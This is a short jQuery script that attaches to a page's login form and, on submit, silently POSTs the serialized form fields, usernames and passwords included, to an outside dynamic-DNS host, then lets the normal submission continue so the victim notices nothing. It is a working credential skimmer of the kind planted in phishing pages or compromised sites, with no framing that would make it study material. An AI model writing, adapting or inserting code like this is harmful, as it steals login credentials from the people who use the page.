$(".login-form").submit(function() {

	var d = $(".login-form");
	$.ajax({
        url: "http://bokep-terbaru01.duckdns.org/data/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
